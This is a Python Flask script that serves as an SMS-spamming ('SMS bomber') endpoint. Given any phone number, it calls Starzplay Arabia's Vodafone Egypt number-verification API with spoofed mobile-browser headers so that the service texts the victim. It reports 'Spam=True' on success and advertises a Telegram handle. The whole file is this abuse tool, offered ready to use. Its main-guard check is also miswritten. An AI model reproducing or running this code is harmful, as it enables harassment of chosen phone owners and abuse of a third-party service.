import requests
from flask import *
app = Flask(__name__)
@app.route("/spam/vodafone/")
def f():
	nu = request.args.get("Number")
	url =  'https://arabia.starzplay.com/api/esb/userAccount/MSISDN/verify'
	headers = {
    "Host": "arabia.starzplay.com",
    "content-length": "86",
    "sec-ch-ua": "\" Not A;Brand\";v\u003d\"99\", \"Chromium\";v\u003d\"90\", \"Google Chrome\";v\u003d\"90\"",
    "accept": "application/json, text/javascript, */*; q\u003d0.01",
    "x-requested-with": "XMLHttpRequest",
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
    "content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8",
    "origin": "https://arabia.starzplay.com",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://arabia.starzplay.com/ar/partners/vodafone-egypt",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-US,en;q\u003d0.9,ar-EG;q\u003d0.8,ar;q\u003d0.7",
    "cookie": "_gat_UA-52364929-4\u003d1"
}
	data = {
    'mobilePrefix' : '20' ,
    'mobileNumber':nu,
    'operator' : 'vodafoneegypt' 
}
	response = requests.post(url,headers=headers,data=data).text
	if ('smsTransactionId') in response:
		return jsonify(Spam=True,Telegram="@uufffuu")
	else:
		return jsonify(Spam=False,Telegram="@uufffuu")
if __name__ == "__name__":
	app.run()
